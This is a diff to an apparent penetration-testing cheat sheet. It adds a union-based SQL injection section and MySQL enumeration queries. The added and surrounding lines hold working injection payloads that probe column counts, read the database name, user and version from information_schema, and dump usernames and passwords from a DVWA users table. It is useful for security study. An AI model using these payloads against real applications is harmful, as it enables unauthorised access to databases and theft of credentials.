@@ -19,6 +19,7 @@
   * [Hashcat](#hashcat)
 * [SQL Injection](#SQL-Injection)
   * [Examining the database](#examining-the-database)
+  * [Union based SQL Injection](#Union-based-sql-injection)
   * [Blind SQL Injection](#Blind-SQL-Injection)
   * [Error based SQL Injection](#error-based-sql-injection)
   * [Filter bypass](#filter-bypass)
@@ -239,6 +240,7 @@ mysql -uroot -p'root' -h192.168.248.16 -P 3306 --skip-ssl
 
 ~~~ sql
 select version();
+select user();
 select system_user();
 show databases;
 ~~~
@@ -389,6 +391,7 @@ reference: [https://pentestmonkey.net/category/cheat-sheet/sql-injection](https:
 
 ~~~ sql
 -- MySQL
+UNION SELECT TABLE_NAME,COLUMN_NAME, TABLE_SCHEMA FROM information_schema.columns WHERE TABLE_SCHEMA = database() -- //
 UNION SELECT TABLE_NAME,TABLE_SCHEMA FROM information_schema.tables WHERE TABLE_SCHEMA = 0x64767761# 0x64767761 = 'dvwa'
 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 0x7573657273# 0x7573657273 = 'users'
 UNION SELECT USER, PASSWORD FROM USERS#
@@ -400,6 +403,16 @@ SELECT * FROM T_USER WHERE ROWNUM <= 5;
 ~~~
 
 reference: [https://portswigger.net/web-security/sql-injection/examining-the-database](https://portswigger.net/web-security/sql-injection/examining-the-database)
+
+
+## Union based SQL Injection
+
+~~~ sql
+' ORDER BY 1-- //
+%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
+%' UNION SELECT database(), user(), @@version, null, null -- //
+~~~
+
 
 ## Blind SQL Injection
 
